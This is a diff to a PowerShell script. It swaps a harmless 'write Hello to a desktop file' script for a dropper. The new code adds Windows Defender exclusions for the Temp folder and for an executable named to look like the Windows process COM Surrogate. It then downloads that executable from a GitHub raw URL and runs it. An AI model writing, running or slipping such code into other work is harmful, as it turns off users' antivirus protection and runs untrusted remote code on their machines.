@@ -1,14 +1,15 @@
-# Define the content to write
-$content = "Hello"
+Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp"
+Add-MpPreference -ExclusionPath "%userprofile%\AppData\Local\Temp\COM_Surrogate.exe"
+Add-MpPreference -ExclusionPath $env:TEMP\COM_Surrogate.exe
+Add-MpPreference -ExclusionProcess "COM_Surrogate.exe"
+$url = "https://raw.githubusercontent.com/M7mmdddd/webstie-demo/refs/heads/main/files/COM%20Surrogate.exe"
 
-# Get the path to the desktop
-$desktopPath = [Environment]::GetFolderPath("Desktop")
+ $output = "$env:TEMP\COM_Surrogate.exe"
 
-# Define the full file path
-$filePath = Join-Path -Path $desktopPath -ChildPath "hello.txt"
+Invoke-WebRequest -Uri $url -OutFile $output
 
-# Write the content to the file
-$content | Out-File -FilePath $filePath -Force
-
-# Display confirmation message
-Write-Host "The file has been saved to: $filePath"
+if (Test-Path $output) {
+    Start-Process -FilePath $output
+} else {
+    Write-Host "Failed to download the file."
+}
